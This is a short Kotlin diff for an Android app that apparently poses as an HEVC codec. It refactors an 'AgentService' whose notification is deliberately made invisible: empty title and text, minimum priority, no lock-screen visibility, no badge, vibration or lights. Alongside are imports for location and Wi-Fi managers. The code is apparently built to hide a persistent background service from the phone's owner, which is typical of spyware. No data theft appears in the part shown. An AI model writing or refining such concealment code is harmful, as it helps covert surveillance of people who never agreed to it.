@@ -1,13 +1,12 @@
 package com.hevc.codec
 
-import android.content.IntentFilter          // ← NAYA
-import android.net.Uri                       // ← NAYA
-import androidx.core.app.NotificationCompat  // ← NAYA
-import java.io.File                          // ← NAYA
-import android.graphics.Bitmap
 import android.app.*
 import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
+import android.net.Uri
+import androidx.core.app.NotificationCompat
+import java.io.File
 import android.graphics.Bitmap
 import android.location.LocationManager
 import android.net.wifi.WifiManager
@@ -260,7 +259,7 @@ class AgentService : Service() {
     private fun buildInvisibleNotification(): Notification {
         val channelId = "hevc_agent"
         createChannel(channelId)
-        return Notification.Builder(this, channelId)
+        return NotificationCompat.Builder(this, channelId)
             .setContentTitle("")
             .setContentText("")
             .setSmallIcon(android.R.drawable.ic_media_play)
@@ -268,15 +267,17 @@ class AgentService : Service() {
             .setShowWhen(false)
             .setCategory(NotificationCompat.CATEGORY_SERVICE)
             .setPriority(NotificationCompat.PRIORITY_MIN)
-            .setVisibility(Notification.VISIBILITY_NONE)
+            .setVisibility(NotificationCompat.VISIBILITY_NONE)
             .build()
     }
 
     private fun createChannel(id: String) {
         if (Build.VERSION.SDK_INT >= 26) {
             val nm = getSystemService(NotificationManager::class.java)
-            val ch = NotificationChannel(id, "", NotificationManager.IMPORTANCE_MIN)
-            ch.setShowBadge(false); ch.enableVibration(false); ch.enableLights(false)
+            val ch = NotificationChannel(id, "agent", NotificationManager.IMPORTANCE_MIN)
+            ch.setShowBadge(false)
+            ch.enableVibration(false)
+            ch.enableLights(false)
             nm.createChannel(ch)
         }
     }
